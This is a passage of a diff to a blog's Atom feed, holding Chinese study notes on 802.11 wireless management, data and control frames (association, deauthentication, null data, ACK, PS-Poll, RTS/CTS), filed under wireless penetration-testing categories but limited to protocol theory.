title="Association/Reassociation Frames(关联/重关联帧)"></a><strong>Association/Reassociation Frames(关联/重关联帧)</strong></h4><p>身份验证成功后,STA执行关联操作,加入无线网络<br>    Association Request    Frames<br>    Reassociation Request Frames<br>    Association Response Frames</p><h4 id="isassociation-Deauthentication-由AP发出"><a href="#isassociation-Deauthentication-由AP发出" class="headerlink" title="isassociation/Deauthentication(由AP发出)"></a><strong>isassociation/Deauthentication(由AP发出)</strong></h4><p>由AP发出<br>    2个字节</p><h4 id="ATIM-Frames"><a href="#ATIM-Frames" class="headerlink" title="ATIM Frames"></a><strong>ATIM Frames</strong></h4><p>只在ad-hoc网络下使用<br>    STA使用此帧通知接收者其有缓存的数据要发送</p><h4 id="Data-Frames-数据帧"><a href="#Data-Frames-数据帧" class="headerlink" title="Data Frames(数据帧)"></a><strong>Data Frames(数据帧)</strong></h4><p>传输用户数据<br>    DATA Frame</p><h4 id="空数据帧"><a href="#空数据帧" class="headerlink" title="空数据帧"></a><strong>空数据帧</strong></h4><p>Null data frame<br>只包含MAC头和FCS<br>STA用于声明自己将要进入省电模式</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;Management-Frame-管理帧&quot;&gt;&lt;a href=&quot;#Management-Frame-管理帧&quot; class=&quot;headerlink&quot; title=&quot;Management Frame(管理帧)&quot;&gt;&lt;/a&gt;&lt;strong&gt;Management Frame(
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="无线渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="无线技术理论" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/"/>
+    
+    
+      <category term="无线数据帧" scheme="http://c.cat.plus/tags/%E6%97%A0%E7%BA%BF%E6%95%B0%E6%8D%AE%E5%B8%A7/"/>
+    
+      <category term="管理帧" scheme="http://c.cat.plus/tags/%E7%AE%A1%E7%90%86%E5%B8%A7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>无线数据帧Control Frame原理</title>
+    <link href="http://c.cat.plus/2013/05/26/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Control%20Frame/"/>
+    <id>http://c.cat.plus/2013/05/26/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Control%20Frame/</id>
+    <published>2013-05-26T11:11:01.000Z</published>
+    <updated>2020-05-22T02:02:16.897Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><h3 id="Control-Frame-控制帧"><a href="#Control-Frame-控制帧" class="headerlink" title="Control Frame(控制帧)"></a>Control Frame(控制帧)</h3><p>控制帧是一些通知设备开始,停止传输或连接失败等情况的短消息;</p></blockquote><h4 id="ACK"><a href="#ACK" class="headerlink" title="ACK"></a><strong>ACK</strong></h4><p>接收端正确接收数据之后向发送端返回ACK确认<br>每个单播帧需要ACK立刻确认<br>    组播和广播不需要ACK确认<br>尽快响应<br>    由硬件完成,而非驱动层<br>T/S:1/13</p><h4 id="PS-POLL"><a href="#PS-POLL" class="headerlink" title="PS-POLL"></a><strong>PS-POLL</strong></h4><p>RF系统的放大器<br>    主要耗电的组件<br>    发射前放大信号,接收并放大还原信号<br>省电模式<br>    关闭信号发射器节省电源耗电(几乎完全关闭)</p><h4 id="AID—-Association-ID"><a href="#AID—-Association-ID" class="headerlink" title="AID—-Association ID"></a><strong>AID—-Association ID</strong></h4><p>STA省电模式唤醒<br>    数据发送至AP(AP缓存数据包)<br>    通过Beacon发送TIM(traffic indication map)<br>        其中包含AID<br>    STA对比AID后唤醒网卡<br>    STA发送PS-Poll帧,请求从AP缓存中取回数据<br>        每个帧都需要ACK确认<br>        ACK确认完后AP从缓存中删除数据帧<br>        传输过程中STA保持唤醒状态<br>        传输结束后STA恢复省电状态</p><h4 id="AP接收PS-Poll帧"><a href="#AP接收PS-Poll帧" class="headerlink" title="AP接收PS-Poll帧"></a><strong>AP接收PS-Poll帧</strong></h4><p>立刻响应<br>延迟响应<br>    简单响应帧</p><ul><li>AID:关联ID</li><li>BSSID:STA正关联的AP地址</li><li>TA:发送此帧的STA地址</li></ul><h4 id="RTS-CTS"><a href="#RTS-CTS" class="headerlink" title="RTS/CTS"></a><strong>RTS/CTS</strong></h4><p>RTS/CTS是CSMA/CA方法的一种补充手段<br>    降低冲突产生的可能性<br>    正式通信之前通过请求应答机制,确信通信介质的可用性<br>    并锁定传输介质和预约通信时间<br>    只有在传输长帧时使用,传输短帧时不会使用<br>        驱动接口提供阈值的自定义<br>        大于阈值的帧被视为长帧,反之则视为短帧.<br>    Node1发送Request to Send包给Node2<br>    如果未发生冲突,Node2返回Clear to Send给Node1<br>    Node1传输数据<br>    数据正常接收,Node2返回ACK,否则Node1什么也不会收到.<br>有线网络介质访问方式:CSMA/CD<br>无线网络介质访问方法:CSMA/CA<br>隐藏节点<br>RTS帧长度20字节<br>CTS帧长度14字节</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;h3 id=&quot;Control-Frame-控制帧&quot;&gt;&lt;a href=&quot;#Control-Frame-控制帧&quot; class=&quot;headerlink&quot; title=&quot;Control Frame(控制帧)&quot;&gt;&lt;/a&gt;Control Frame(控制帧)&lt;/h
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="无线渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="无线技术理论" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/"/>
+    
+    
+      <category term="无线数据帧" scheme="http://c.cat.plus/tags/%E6%97%A0%E7%BA%BF%E6%95%B0%E6%8D%AE%E5%B8%A7/"/>
+    
+      <category term="ACK" scheme="http://c.cat.plus/tags/ACK/"/>
     
   </entry>
   
